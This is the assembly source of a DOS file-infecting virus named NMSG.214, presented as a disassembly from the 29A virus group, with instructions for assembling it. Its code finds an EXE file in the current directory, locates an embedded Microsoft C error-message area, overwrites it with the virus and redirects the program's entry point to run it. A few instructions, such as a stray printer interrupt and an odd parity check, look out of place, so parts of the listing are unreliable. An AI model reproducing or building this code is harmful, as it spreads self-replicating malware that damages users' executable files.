comment *
                                NMSG.214               млллллм млллллм млллллм
                             Disassembly by            ллл ллл ллл ллл ллл ллл
                              Darkman/29A               мммллп плллллл ллллллл
                                                       лллмммм ммммллл ллл ллл
                                                       ллллллл ллллллп ллл ллл

  NMSG.214 is a runtime/direct action cavity EXE virus. Infects one file in
  current directory, by searching for an area of Microsoft C error messages
  and overwriting that area with the virus.

  I would like to thank VirusBuster/29A for providing me with the binary of
  this virus.
  
  To compile NMSG.214 with Turbo Assembler v 5.0 type:
    TASM /M NMSG_214.ASM
    TLINK /x NMSG_214.OBJ
*

.model tiny
.code
.186

code_begin:
             call    delta_offset
virus_begin:
initial_csip:
initial_ip   dw      00h                 ; Initial IP
initial_cs   dw      0fff0h              ; Initial CS relative to start of ...
file_specifi db      '*.exe',00h         ; File specification
string_begin:
scan_string  db      '<<NMSG>>'
string_end:
delta_offset:
             pop     bp                  ; Load BP from stack

             push    ds es               ; Save segments at stack

             mov     ax,ss               ; AX = stack segment
             add     ah,10h              ; AX = segment of buffer

             mov     bx,ds:[02h]         ; BX = segment of first byte beyon...
             sub     bx,ax               ; Subtract stack segment from segm...
             cmp     bh,10h              ; Insufficient memory?
             jb      virus_exit          ; Below? Jump to virus_exit

             mov     es,ax               ; ES = segment of buffer
             xor     dx,dx               ; DX = offset of Disk Transfer Ar...


             push    ss                  ; Save SS at stack
             pop     ds                  ; Load DS from stack (SS)

             mov     ah,1ah              ; Set Disk Transfer Area address
             int     21h

             mov     ah,4eh              ; Find first matching file (DTA)
             xor     cx,cx               ; CX = file attribute mask
             lea     dx,[bp+(file_specifi-virus_begin)]

             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)

             int     21h
             jc      virus_exit          ; Error? Jump to virus_exit
examine_file:
             mov     ax,ss:[1ch]         ; AX = high-order word of file size
             or      ax,ax               ; Filesize too large?
             jnz     find_next           ; Not zero? Jump to find_next

             clc                         ; Clear carry flag
             call    read_file
             jc      find_next           ; Error? Jump to find_next
             shl     word ptr ds:[0ch],01h
             jp      find_next           ; Too much addition... Jump to find_next

             cld                         ; Clear direction flag
             lea     si,[bp+(scan_string-virus_begin)]
             xor     di,di               ; Zero DI

             push    cs                  ; Save CS at stack
             pop     ds                  ; Load DS from stack (CS)
compare_loop:
             pusha                       ; Save all registers at stack
             mov     cx,(string_end-string_begin)
             rep     cmpsb               ; Microsoft C error messages?
             popa                        ; Load all registers from stack
             je      infect_file         ; Equal? Jump to infect_file

             inc     di                  ; Increase index register

             loop    compare_loop
find_next:
             mov     ah,4fh              ; Find next matching file (DTA)
             int     21h
             jnc     examine_file        ; No error? Jump to examine_file

             int     17h
virus_exit:
             pop     es ds               ; Load segments from stack

             mov     dx, 80h             ; DX = offset of default Disk tran...
             mov     ah,1ah              ; Set Disk Transfer Area address
             int     21h

             mov     ax,cs               ; AX = code segment
             add     cs:[bp+(initial_cs-virus_begin)],ax
             jmp     dword ptr cs:[bp+(initial_csip-virus_begin)]
infect_file:
             mov     bx,di               ; BX = offset of virus within file
             lea     si,[bp+(code_begin-virus_begin)]
             mov     cx,(code_end-code_begin)
             rep     movsb               ; Move virus to Microsoft C error ...

             push    es                  ; Save ES at stack
             pop     ds                  ; Load DS from stack (ES)

             mov     si,14h              ; SI = offset of initial IP
             lea     di,[bx+(initial_csip-code_begin)]
             push    si                  ; Save SI at stack
             movsw                       ; Store initial IP
             movsw                       ; Store initial CS relative to sta...
             pop     si                  ; Load SI from stack
             
             mov     [si+02h],cx         ; Store initial CS relative to sta...
             mov     ax,ds:[08h]         ; AX = header size in paragraphs
             mov     cl,04h              ; Multiply header size in paragrap...
             shl     ax,cl               ; AX = header size
             sub     bx,ax               ; Subtract header size from initia...
             mov     [si],bx             ; Store initial IP

             stc                         ; Set carry flag
             call    write_file

             jmp     virus_exit

read_file    proc    near                ; Read from file
write_file   proc    near                ; Write to file
             pushf                       ; Save flags at stack
             mov     ax,3d00h            ; Open file (read); Create or trun...
             sbb     ah,al               ;  "    "      "      "    "     "
             xor     cx,cx               ; CX = file attributes
             mov     dx,1eh              ; DX = offset of filename

             push    ss                  ; Save SS at stack
             pop     ds                  ; Load DS from stack (SS)

             int     21h
             mov     bx,ax               ; BX = file handle
             pop     ax                  ; Load AX from stack (flags)
             jc      error               ; Error? Jump to error

             mov     cx,ds:[1ah]         ; CX = low-order word of file size

             push    es                  ; Save ES at stack
             pop     ds                  ; Load DS from stack (ES)

             xor     dx,dx               ; Zero DX
             mov     ah,al               ; AH = low-order byte of flags
             sahf                        ; Store register AH into flags

             mov     ah,3fh              ; Read from file; Write to file
             adc     ah,dl               ;  "    "     "     "   "   "
             int     21h

             mov     ah,3eh              ; Close file
             int     21h
error:
             ret                         ; Return
             endp
             endp
code_end:

end          code_begin